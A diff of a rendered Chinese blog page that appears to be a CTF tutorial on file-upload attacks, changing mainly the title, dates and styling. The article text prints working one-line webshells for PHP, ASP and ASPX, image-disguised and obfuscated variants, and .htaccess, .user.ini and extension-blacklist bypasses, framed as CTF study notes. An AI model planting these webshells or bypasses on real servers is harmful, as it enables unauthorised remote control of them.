@@ -13,7 +13,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2024/10/31/文件上传/"/>
+    <link rel="canonical" href="http://example.com/2024/11/01/文件上传/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -23,14 +23,14 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF中的RCE">
-<meta property="og:url" content="http://example.com/2024/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:title" content="niu">
+<meta property="og:url" content="http://example.com/2024/11/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="Bae">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
-<meta property="article:published_time" content="2024-10-31T12:21:15.000Z">
-<meta property="article:modified_time" content="2024-11-01T15:42:10.227Z">
+<meta property="article:published_time" content="2024-11-01T12:42:03.000Z">
+<meta property="article:modified_time" content="2025-03-13T16:17:00.761Z">
 <meta property="article:author" content="Bae">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
@@ -45,7 +45,7 @@
     
     <title>
         
-            CTF中的RCE | Theme Redefine
+            niu | Theme Redefine
         
     </title>
 
@@ -234,7 +234,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">CTF中的RCE</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">niu</h1>
 			</div>
 			
 		</div>
@@ -255,15 +255,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-10-31 20:21:15</span>
-        <span class="mobile">2024-10-31 20:21:15</span>
+        <span class="desktop">2024-11-01 20:42:03</span>
+        <span class="mobile">2024-11-01 20:42:03</span>
         <span class="hover-info">创建</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-01 23:42:10</span>
-            <span class="mobile">2024-11-01 23:42:10</span>
+            <span class="desktop">2025-03-14 00:17</span>
+            <span class="mobile">2025-03-14 00:17</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -293,12 +293,12 @@
 			<h1 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传">#</a> 文件上传</h1>
 <p>顾名思义，就是往网站的服务器里去上传自己的东西，如果传入木马，即可控制服务器取得 shell 权限为所欲为。</p>
 <p>一句话木马：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a可以是任何东西，这里的内容就是用蚁剑连接的密码</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a可以是任何东西，这里的内容就是用蚁剑连接的密码</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 <p>这里的 GIF89a 是 GIF 文件的签名    GIF 文件的标准头标记为  <code>GIF89a</code> ，表示这是一个 GIF 图片文件。部分文件上传机制会验证文件是否为图片文件，仅检查文件头。如果仅检查文件是否包含  <code>GIF89a</code>  就允许上传，该文件会被识别为 GIF 文件，从而绕过图片文件的上传限制。</p>
 <p>后面则是一句话木马，</p>
 <p>除这样最简单的一句话木马，还有很多变种</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<p>以及更多种类<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76786857/article/details/131213615?ops_request_misc=%7B%22request%5Fid%22%3A%223FC0E2D5-9874-4957-9301-9F6C3EDA5D44%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=3FC0E2D5-9874-4957-9301-9F6C3EDA5D44&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-131213615-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&amp;spm=1018.2226.3001.4187" >一句话木马大全_不删 index.php 内容添加一句话马 - CSDN 博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%                                    %&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>以及更多种类<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76786857/article/details/131213615?ops_request_misc=%7B%22request%5Fid%22%3A%223FC0E2D5-9874-4957-9301-9F6C3EDA5D44%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=3FC0E2D5-9874-4957-9301-9F6C3EDA5D44&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-131213615-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&amp;spm=1018.2226.3001.4187" >一句话木马大全_不删 index.php 内容添加一句话马 - CSDN 博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <p>下面开始看各种各样的题型</p>
 <h2 id="前端校验"><a class="markdownIt-Anchor" href="#前端校验">#</a> 前端校验</h2>
 <p>前端验证直接传 jpg 或是 png 后缀的即可，内容就是一句话木马，抓包后再改回 php，或是直接 rce 或者连接也 ok</p>
@@ -308,7 +308,7 @@
 <h3 id="mime验证"><a class="markdownIt-Anchor" href="#mime验证">#</a> MIME 验证</h3>
 <p>前置知识 $_FILES</p>
 <p>超全局变量 $_FILES 是一个二维数组，用来保存客户端上传到服务器的文件信息。二维数组的行是文件域的名称，列有 5 个。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、$_FILES[][&#x27;name&#x27;] 	#上传的文件名</span><br><span class="line">2、$_FILES[][&#x27;type&#x27;] 	#上传的文件类型，这个类型是MIME类型（image/jpeg image/gif image/png）</span><br><span class="line">3、$_FILES[][&#x27;size&#x27;] 	#文件的大小，以字节为单位</span><br><span class="line">4、$_FILES[][&#x27;tmp_name&#x27;] #文件上传时候的临时文件</span><br><span class="line">5、$_FILES[][&#x27;error&#x27;]	#错误编码（值有0、1、2、3、4、6、7）0表示正确1</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、$_FILES[][&#x27;name&#x27;] 	#上传的文件名</span><br><span class="line">2、$_FILES[][&#x27;type&#x27;] 	#上传的文件类型，这个类型是MIME类型（image/jpeg image/gif image/png）</span><br><span class="line">3、$_FILES[][&#x27;size&#x27;] 	#文件的大小，以字节为单位</span><br><span class="line">4、$_FILES[][&#x27;tmp_name&#x27;] #文件上传时候的临时文件</span><br><span class="line">5、$_FILES[][&#x27;error&#x27;]	#错误编码（值有0、1、2、3、4、6、7）0表示正确1</span><br></pre></td></tr></table></figure></div>
 <p>eg：</p>
 <p><img  
                      lazyload
@@ -320,7 +320,7 @@
 <h3 id="php3-phtml绕过黑名单"><a class="markdownIt-Anchor" href="#php3-phtml绕过黑名单">#</a> php3、phtml 绕过黑名单</h3>
 <p>如果题目禁止上传.asp|.aspx|.php|.jsp 后缀文件</p>
 <p>可以使用 php2 php3 php5 php7 phtml 等绕过</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP5文件实际上就是.PHP文件，只不过代码由PHP5引擎解析。</span><br><span class="line"></span><br><span class="line">PHP5是一种PHP版本间的区分，该后缀名并不常见，另外还有.PHP2、.PHP3和.PHP4文件。而当前最新的PHP版本为PHP7。</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP5文件实际上就是.PHP文件，只不过代码由PHP5引擎解析。</span><br><span class="line"></span><br><span class="line">PHP5是一种PHP版本间的区分，该后缀名并不常见，另外还有.PHP2、.PHP3和.PHP4文件。而当前最新的PHP版本为PHP7。</span><br></pre></td></tr></table></figure></div>
 <h3 id="htaccess绕过黑名单"><a class="markdownIt-Anchor" href="#htaccess绕过黑名单">#</a> .htaccess 绕过黑名单</h3>
 <p>禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf 后缀文件！</p>
 <p>前置知识 .htaccess<br>
@@ -348,7 +348,7 @@
 Addhandler 使用 php5-script 处理器来解析所匹配到的文件。<br>
 AddType 将特定扩展名文件映射为 php 文件类型。</p>
 <p>.htaccess 文件内容如下</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;123.jpg&quot;&gt;   </span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;123.jpg&quot;&gt;   </span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>
 <p>上传时先传.htaccess 文件，再上传 123.jpg</p>
 <h3 id="userini黑名单"><a class="markdownIt-Anchor" href="#userini黑名单">#</a> .user.ini 黑名单</h3>
 <p>前置知识 .user.ini<br>
@@ -363,19 +363,19 @@ AddType 将特定扩展名文件映射为 php 文件类型。</p>
 <p>auto_prepend_file/auto_append_file（这两个设置的区别只是在于 auto_prepend_file 是在文件前插入，auto_append_file 在文件最后插入。）<br>
 这两个配置可以在 php 文件执行之前先包含制定的文件，所以我们可以上传一个图片马，这样就可以通过.user.ini 使得这个图片马被包含，从而获取 webshell</p>
 <p>.user.ini</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure></div>
 <p>.user.ini 文件里的意思是：所有的 php 文件都自动包含 a.jpg 文件。.user.ini 相当于一个用户自定义的 php.ini<br>
- 这里有一个讲的非常清楚的<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52635170/article/details/126962920?ops_request_misc=%7B%22request%5Fid%22%3A%223904B258-3199-4EAB-976C-D3440A2A0E85%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=3904B258-3199-4EAB-976C-D3440A2A0E85&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-126962920-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=user.ini&amp;spm=1018.2226.3001.4187" >文件上传 -.user.ini 的妙用 - CSDN 博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+ 这里有一个讲的非常清楚的<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52635170/article/details/126962920?ops_request_misc=%7B%22request%5Fid%22%3A%223904B258-3199-4EAB-976C-D3440A2A0E85%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=3904B258-3199-4EAB-976C-D3440A2A0E85&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-126962920-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=user.ini&amp;spm=1018.2226.3001.4187" >文件上传 -.user.ini 的妙用 - CSDN 博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <h4 id="思路二"><a class="markdownIt-Anchor" href="#思路二">#</a> <strong>思路二</strong></h4>
 <p>用 5.php. . 绕过</p>
 <p>代码运行最后得到的后缀为 &quot;.&quot; 不在黑名单中 然而又用原来的 5.php. . 来拼接路径 由于 windows 在</p>
 <p>文件命名中会删除。和空格 所以最终得到的是 5.php 因此绕过了黑名单限制</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">$img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">$img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br></pre></td></tr></table></figure></div>
 <h3 id="大小写绕过黑名单"><a class="markdownIt-Anchor" href="#大小写绕过黑名单">#</a> 大小写绕过黑名单</h3>
 <p>禁止上传.htaccess .user.ini 时去试一下</p>
 <p>这个比较好理解</p>
 <p>大小写绕过失效 改为短标签</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo 1; ?&gt; 正常写法</span><br><span class="line"></span><br><span class="line">&lt;? echo 1; ?&gt; 短标签写法，5.4 起 &lt;?= &#x27;hello&#x27;; === &lt;? echo &#x27;hello&#x27;;</span><br><span class="line"></span><br><span class="line">&lt;?= phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">&lt;% echo 1; %&gt; asp 风格写法</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;php&quot;&gt; echo 1; &lt;/script&gt; 长标签写法</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo 1; ?&gt; 正常写法</span><br><span class="line"></span><br><span class="line">&lt;? echo 1; ?&gt; 短标签写法，5.4 起 &lt;?= &#x27;hello&#x27;; === &lt;? echo &#x27;hello&#x27;;</span><br><span class="line"></span><br><span class="line">&lt;?= phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">&lt;% echo 1; %&gt; asp 风格写法</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;php&quot;&gt; echo 1; &lt;/script&gt; 长标签写法</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -442,7 +442,7 @@ AddType 将特定扩展名文件映射为 php 文件类型。</p>
 <h1 id="补充"><a class="markdownIt-Anchor" href="#补充">#</a> 补充：</h1>
 <p>如果 [] 被 ban 了可以用 {}</p>
 <p>大括号也被 ban 了 所以不使用一句话木马 而是直接 rce 注意嗷！分号也被 ban 了 直接删除即可</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;? exec(&#x27;cat ../f* &gt; myflag.txt&#x27;)?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;? exec(&#x27;cat ../f* &gt; myflag.txt&#x27;)?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 <p>解释一下命令语句：</p>
 <ul>
 <li>system : 输出并返回最后一行的 shell 结果</li>
@@ -457,10 +457,10 @@ AddType 将特定扩展名文件映射为 php 文件类型。</p>
                      data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241101233425888.png"
                       alt="image-20241101233425888"
                 ></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;? `cat ../f* &gt; myflag.txt` ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo `tac ../f*` ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;? `cat ../f* &gt; myflag.txt` ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo `tac ../f*` ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 <p>再往后就需要免杀了，之后补充</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89A</span><br><span class="line"></span><br><span class="line">&lt;?=($a=&quot;s#y#s#t#e#m&quot;)&amp;&amp;($b=explode(&quot;#&quot;,$a))&amp;&amp;($c=$b[0].$b[1].$b[2].$b[3].$b[4].$b[5])&amp;&amp;$c($_REQUEST[1]);?&gt;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89A</span><br><span class="line"></span><br><span class="line">&lt;?=($a=&quot;s#y#s#t#e#m&quot;)&amp;&amp;($b=explode(&quot;#&quot;,$a))&amp;&amp;($c=$b[0].$b[1].$b[2].$b[3].$b[4].$b[5])&amp;&amp;$c($_REQUEST[1]);?&gt;</span><br></pre></td></tr></table></figure></div>
 <p>之前 buildctf 用的，感觉很好，把 system 拆开再拼接上去来绕过完了 rce</p>
 <p><em>文件上传时在木马代码前添加大量字符是一种绕过服务器检测的<strong>偏移量攻击（offset attack）* 或 * 垃圾填充攻击（padding attack）</strong>。它的目的是掩盖木马代码，使服务器在扫描时无法识别到其中的恶意内容。具体原理和方式如下：</em></p>
 <h3 id="1-偏移量攻击offset-attack"><a class="markdownIt-Anchor" href="#1-偏移量攻击offset-attack">#</a> <em>1. <strong>偏移量攻击（Offset Attack）</strong></em></h3>
@@ -473,18 +473,18 @@ AddType 将特定扩展名文件映射为 php 文件类型。</p>
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> CTF中的RCE</li>
+        <li><strong>标题:</strong> niu</li>
         <li><strong>作者:</strong> The Redefine Team</li>
         <li><strong>创建于
-                :</strong> 2024-10-31 20:21:15</li>
+                :</strong> 2024-11-01 20:42:03</li>
         
             <li>
                 <strong>更新于
-                    :</strong> 2024-11-01 23:42:10
+                    :</strong> 2025-03-14 00:17:00
             </li>
         
         <li>
-            <strong>链接:</strong> https://redefine.ohevan.com/2024/10/31/文件上传/
+            <strong>链接:</strong> https://redefine.ohevan.com/2024/11/01/文件上传/
         </li>
         <li>
             <strong>
@@ -589,7 +589,7 @@ AddType 将特定扩展名文件映射为 php 文件类型。</p>
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">目录</div>
-		<div class="page-title">CTF中的RCE</div>
+		<div class="page-title">niu</div>
 		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text"> 文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E6%A0%A1%E9%AA%8C"><span class="nav-text"> 前端校验</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E6%A0%A1%E9%AA%8C"><span class="nav-text"> 后端校验</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mime%E9%AA%8C%E8%AF%81"><span class="nav-text"> MIME 验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php3-phtml%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text"> php3、phtml 绕过黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text"> .htaccess 绕过黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#userini%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text"> .user.ini 黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text"> 大小写绕过黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text"> 空格绕过黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%82%B9%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text"> 点绕过黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text"> ::$DATA 绕过黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text"> 点空格点绕过黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E5%86%99php%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text"> 双写 php 绕过黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00%E6%88%AA%E6%96%AD%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-text"> %00 截断白名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="nav-text"> 文件包含 + 图片马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-text"> 条件竞争</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-text"> 补充：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%81%8F%E7%A7%BB%E9%87%8F%E6%94%BB%E5%87%BBoffset-attack"><span class="nav-text"> 1. 偏移量攻击（Offset Attack）</span></a></li></ol></li></ol></li></ol>
 
 	</div>
